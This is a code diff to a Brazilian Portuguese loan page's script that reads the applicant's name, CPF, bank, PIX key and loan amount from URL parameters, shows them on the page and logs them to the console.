@@ -411,11 +411,53 @@
         document.getElementById('loanAmountText2').textContent = loanAmount;
         document.getElementById('loanAmountText3').textContent = loanAmount;
 
-        // Parâmetros da URL para compatibilidade com código antigo
+        // Recuperar parâmetros da URL (prioridade superior ao localStorage)
         const urlParams = new URLSearchParams(window.location.search);
-        const name = decodeURIComponent(urlParams.get('name')) || fullName;
-        const cpf = decodeURIComponent(urlParams.get('cpf')) || formattedCpf;
-        const telephone = decodeURIComponent(urlParams.get('telephone')) || userData.phone || 'Telefone não disponível';
+        
+        // Obter dados básicos (nome, cpf, telefone)
+        const nameFromUrl = urlParams.get('nome');
+        const cpfFromUrl = urlParams.get('cpf');
+        const phoneFromUrl = urlParams.get('phone');
+        
+        // Obter dados financeiros
+        const bankFromUrl = urlParams.get('bank');
+        const pixKeyFromUrl = urlParams.get('pix_key');
+        const loanAmountFromUrl = urlParams.get('loan_amount');
+        
+        // Priorizar dados da URL, com fallback para localStorage
+        if (nameFromUrl) {
+            document.getElementById('userFirstName').textContent = nameFromUrl.split(' ')[0];
+            document.getElementById('userFullName').textContent = nameFromUrl;
+        }
+        
+        if (cpfFromUrl) {
+            document.getElementById('userCpf').textContent = cpfFromUrl;
+        }
+        
+        if (bankFromUrl) {
+            document.getElementById('userBank').textContent = bankFromUrl;
+        }
+        
+        if (pixKeyFromUrl) {
+            document.getElementById('userPixKey').textContent = pixKeyFromUrl;
+        }
+        
+        if (loanAmountFromUrl) {
+            const formattedAmount = formatCurrency(loanAmountFromUrl);
+            document.getElementById('loanAmountHeader').textContent = formattedAmount;
+            document.getElementById('loanAmountText1').textContent = formattedAmount;
+            document.getElementById('loanAmountText2').textContent = formattedAmount;
+            document.getElementById('loanAmountText3').textContent = formattedAmount;
+        }
+        
+        console.log("Parâmetros da URL:", { 
+            nome: nameFromUrl, 
+            cpf: cpfFromUrl, 
+            phone: phoneFromUrl,
+            bank: bankFromUrl,
+            pix_key: pixKeyFromUrl, 
+            loan_amount: loanAmountFromUrl 
+        });
 
         const payFeeButton = document.getElementById('payFeeButton');
         const popup = document.getElementById('popup');
